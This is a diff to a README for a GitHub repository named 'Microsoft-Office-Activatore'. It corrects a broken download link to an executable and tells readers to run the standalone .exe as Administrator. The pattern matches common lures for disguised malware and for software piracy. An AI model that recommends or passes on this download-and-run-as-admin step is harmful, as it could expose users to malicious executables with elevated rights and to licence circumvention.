@@ -14,7 +14,7 @@
 
 ## 📥 Quick Download
 
-* **[⬇️ Download `default.exe` (v1.0.0)]([https://github.com/nk1990347-cpu/Microsoft-Office-Activatore/releases/download/V1.0.0/default.exe])(https://github.com/nk1990347-cpu/Microsoft-Office-Activatore/releases/download/V1.0.0/AE-Apps_MS-Office-Activatore.exe))**
+* **[⬇️ Download `AE-Apps_MS-Office-Activatore.exe` (v1.0.0)](https://github.com/nk1990347-cpu/Microsoft-Office-Activatore/releases/download/V1.0.0/AE-Apps_MS-Office-Activatore.exe)**
 * **[📦 View All Releases](https://github.com/nk1990347-cpu/Microsoft-Office-Activatore/releases/tag/V1.0.0)**
 
 > **Note:** Zero setup or Python installation is required. Simply download the standalone `.exe` and run it as Administrator!
